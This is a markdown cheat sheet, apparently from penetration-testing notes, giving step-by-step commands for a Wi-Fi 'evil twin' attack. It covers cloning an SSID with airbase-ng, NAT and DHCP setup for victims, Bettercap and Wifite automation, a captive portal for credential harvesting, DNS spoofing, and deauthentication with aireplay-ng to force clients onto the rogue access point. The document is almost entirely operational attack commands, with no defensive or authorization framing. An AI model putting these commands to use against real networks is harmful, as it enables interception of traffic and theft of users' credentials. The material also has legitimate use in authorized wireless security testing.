# Evil Twin Attack

An Evil Twin is a rogue AP with the same SSID as a legitimate network. Victims connect to the fake AP, allowing credential capture or MITM.

## Manual Evil Twin with Airbase-ng
```bash
# 1. Set up monitor mode
sudo airmon-ng start wlan0

# 2. Create the evil twin AP
sudo airbase-ng -e "TargetSSID" -c 6 wlan0mon

# 3. In another terminal, set up NAT to give victims internet access
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1/24

# 4. Enable IP forwarding and NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -j ACCEPT

# 5. Start DHCP server for victims (create dnsmasq.conf)
sudo dnsmasq -C dnsmasq.conf -d

# dnsmasq.conf example:
# interface=at0
# dhcp-range=10.0.0.10,10.0.0.100,12h
# dhcp-option=3,10.0.0.1
# dhcp-option=6,10.0.0.1
```

## Evil Twin with Wifite (Automated)
```bash
# Wifite can do evil twin attacks automatically
sudo wifite --evil-twin --essid TargetSSID
```

## Evil Twin with Bettercap (Advanced)
```bash
# Start bettercap
sudo bettercap -iface wlan0

# Set up AP
set wifi.ap.ssid TargetSSID
set wifi.ap.channel 6
wifi.ap start

# Set up HTTP/HTTPS captive portal for credential capture
set http.server.path /path/to/captive-portal
http.server on
https.server on

# Set up credential sniffer
set net.sniff.verbose true
net.sniff on
```

## Captive Portal for Credential Harvesting
```bash
# Create a fake login page that captures credentials
# Host it on your attack machine
python3 -m http.server 80

# Redirect all DNS to your server
# Use dnsmasq or ettercap to spoof DNS responses
```

## Deauth to Force Clients Off Real AP
```bash
# Deauth clients from real AP so they reconnect to your evil twin
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
```
